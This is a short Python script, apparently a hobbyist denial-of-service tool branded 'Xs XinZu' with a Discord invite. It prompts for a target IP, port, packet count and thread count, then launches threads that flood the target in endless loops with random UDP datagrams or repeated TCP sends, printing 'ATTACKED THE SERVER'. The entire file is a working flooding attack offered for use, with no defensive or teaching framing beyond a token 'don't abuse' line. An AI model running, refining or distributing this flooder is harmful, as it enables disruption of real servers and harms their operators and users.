#!/usr/bin/env python3
import random
import socket
import threading

print ("__   __     __   ___        ______")      
print ("\ \ / /     \ \ / (_)      |___  /")      
print ("\ V / ___   \ V / _ _ __     / / _   _ ")
print ("/   \/ __|  /   \| | '_ \   / / | | | |")
print ("/ /^\ \__ \ / /^\ \ | | | |./ /__| |_| |")
print ("\/   \/___/ \/   \/_|_| |_|\_____/\__,_|")                                                               

print       (" >> TOOLS CREATED BY Xs XinZu <<")
print       (" >> DISCORD : XinZu#7194 << ")
print       (">> DON'T ABUSE MY TOOLS <<")                                   
print       (" >> DM ME IF YOU NEED HELP <<")
print       (" >> JOIN OUR COMMUNITY AND LEARN TOGETHER<<")
print       (" >> https://discord.gg/9BsRU4QAka <<")
    
ip = str(input("  HOST/IP:"))
port = int(input(" Port:"))
choice = str(input(" Mau Gass?(y/n):"))
times = int(input(" Paket:"))
threads = int(input(" Threads:"))
def run():
	data = random._urandom(1000)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" Xs XinZu ATTACKED THE SERVER")
		except:
			print("[!] ERROR SERVER TIME OUT")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Xs XinZu ATTACKED THE SERVER ")
		except:
			s.close()
			print("[*] ERROR SERVER TIME OUT")
            
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()